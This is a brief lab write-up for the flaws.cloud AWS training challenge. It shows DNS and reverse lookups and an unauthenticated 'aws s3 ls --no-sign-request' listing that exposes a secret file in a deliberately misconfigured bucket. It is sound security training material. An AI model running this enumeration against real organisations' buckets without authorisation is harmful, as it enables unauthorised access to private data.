# Shape_AI Project

## Misconfigured s3 Bucket exposure

- **Bucket Name**:- s3-website-us-west-2.amazonaws.com
- **Bucket Source**:- http://flaws.cloud

<br>

> **Steps To reproduce:-**

* Go to [flaws.cloud](http://flaws.cloud)
* Enumerate the host IP
```
┌──(root💀kali)-[/home/kali/aws]
└─# host flaws.cloud                                                                      
flaws.cloud has address 52.218.169.210
```
* Enumerate the bucket name
```
┌──(root💀kali)-[/home/kali/aws]
└─# host 52.218.169.210
210.169.218.52.in-addr.arpa domain name pointer s3-website-us-west-2.amazonaws.com.
```
* Check for Authorization Parameter
```
┌──(root💀kali)-[/home/kali/aws]
└─# aws s3 --region us-west-2 ls flaws.cloud --no-sign-request
2017-03-13 23:00:38       2575 hint1.html
2017-03-02 23:05:17       1707 hint2.html
2017-03-02 23:05:11       1101 hint3.html
2020-05-22 14:16:45       3162 index.html
2018-07-10 12:47:16      15979 logo.png
2017-02-26 20:59:28         46 robots.txt
2017-02-26 20:59:30       1051 secret-dd02c7c.html
```
* Read the Secret document.

> **What Can I Do:-**

* List all files.
* Download any file to my local machine.

> **POC:-**

![Commands](https://raw.githubusercontent.com/sudo-Ayush/Vuln_cloud/main/Poc/poc1.PNG)
<br>

![Secret document](https://raw.githubusercontent.com/sudo-Ayush/Vuln_cloud/main/Poc/poc2.PNG)
